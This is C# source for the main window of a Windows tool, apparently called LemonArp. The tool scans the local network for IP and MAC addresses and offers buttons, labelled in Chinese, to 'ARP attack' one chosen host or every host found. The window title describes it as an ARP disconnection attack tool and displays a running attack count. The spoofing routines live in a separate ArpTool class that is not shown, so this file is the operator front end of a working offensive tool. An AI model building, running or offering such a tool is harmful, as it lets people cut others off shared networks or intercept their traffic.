using SharpPcap.LibPcap;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace LemonArp
{
    public partial class Form1 : Form
    {
        private LibPcapLiveDeviceList deviceList;

        private ArpTool arpTool = null;

        private List<Tuple<IPAddress, PhysicalAddress>> IPMACMapList;
        private const int CS_DropSHADOW = 0x20000;
        private const int GCL_STYLE = (-26);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SetClassLong(IntPtr hwnd, int nIndex, int dwNewLong);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int GetClassLong(IntPtr hwnd, int nIndex);
        private void SetShadow()
        {
            SetClassLong(this.Handle, GCL_STYLE, GetClassLong(this.Handle, GCL_STYLE) | CS_DropSHADOW);
        }
        public Form1()
        {
            InitializeComponent();
            IPMACMapList = new List<Tuple<IPAddress, PhysicalAddress>>();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            deviceList = LibPcapLiveDeviceList.Instance;

            if (deviceList.Count < 1)
            {
                throw new Exception("没有发现本机上的网络设备");
            }

            foreach (var device in deviceList)
            {
                try
                {
                    arpTool = new ArpTool(device);
                    arpTool.ScanStopedEvent += arpTool_ScanStopedEvent;
                    arpTool.ResolvedEvent += arpTool_ResolvedEvent;
                    label2.Text = "网关: " + arpTool.GetwayIP + "  " + arpTool.GetwayMAC
                        + "\r\n本地: " + arpTool.LocalIP + "  " + arpTool.LocalMAC;
                    txbStartIP.Text = txbEndIP.Text = arpTool.GetwayIP.ToString();
                    if (arpTool.GetwayIP.ToString() != "")
                        return;
                }
                catch { }
            }
        }

        private void btnScan_Click(object sender, EventArgs e)
        {
            var button = sender as Button;
            if (button.Text.Equals("搜索"))
            {
                IPAddress startIP, endIP;
                if (!IPAddress.TryParse(txbStartIP.Text, out startIP) || !IPAddress.TryParse(txbEndIP.Text, out endIP))
                {
                    MessageBox.Show("不合法的IP地址");
                    return;
                }

                IP start = new IP(startIP);
                IP end = new IP(endIP);
                if (end.SmallerThan(start))
                {
                    MessageBox.Show("开始地址大于结束地址");
                    return;
                }

                button.Text = "停止";
                IPMACMapList.Clear();
                lsbIPMap.Items.Clear();
                arpTool.ScanLAN(start, end);
            }
            else
            {
                arpTool.StopScanLan();
                button.Text = "搜索";
            }
        }

        void arpTool_ResolvedEvent(object sender, ResolvedEventArgs e)
        {
            IPMACMapList.Add(new Tuple<IPAddress, PhysicalAddress>(e.IPAddress, e.PhysicalAddress));
            this.Invoke(new Action(() =>
            {
                lsbIPMap.Items.Add(string.Format("{0} -> {1}", e.IPAddress, e.PhysicalAddress));
            }));
        }
        void arpTool_ScanStopedEvent(object sender, EventArgs e)
        {
            this.Invoke(new Action(() => { btnScan.Text = "搜索"; }));
            MessageBox.Show("搜索结束");
        }

        private void lsbIPMap_SelectedIndexChanged(object sender, EventArgs e)
        {
            if ((sender as TransparentListBox).SelectedIndex >= 0)
            {
                if (btnScan.Text == "搜索")
                {
                    btnArpGetway.Enabled = true;
                    btnArpStorm.Enabled = true;
                }
            }
        }
        private void btnArpGetway_Click(object sender, EventArgs e)
        {
            var button = sender as Button;
            if (button.Text.Equals("ARP攻击"))
            {
                timer1.Start();
                var destIP = IPMACMapList[lsbIPMap.SelectedIndex].Item1;
                var destMAC = IPMACMapList[lsbIPMap.SelectedIndex].Item2;
                arpTool.ARPSpoofing1(destIP, destMAC);
                button.Text = "停止";
            }
            else
            {
                timer1.Stop();
                arpTool.StopARPSpoofing();
                button.Text = "ARP攻击";
            }
        }

        private void btnArpStorm_Click(object sender, EventArgs e)
        {
            var button = sender as Button;
            if (button.Text.Equals("ARP攻击全部"))
            {
                timer1.Start();
                List<IPAddress> ipList = new List<IPAddress>();
                foreach (var tuple in IPMACMapList)
                {
                    ipList.Add(tuple.Item1);
                }
                button.Text = "停止";
                arpTool.ARPStorm(ipList);
            }
            else
            {
                timer1.Stop();
                arpTool.StopARPSpoofing();
                button.Text = "ARP攻击全部";
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            label1.Text = "小萌ARP断网攻击    攻击次数:" + arpTool.d;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }
    }
}
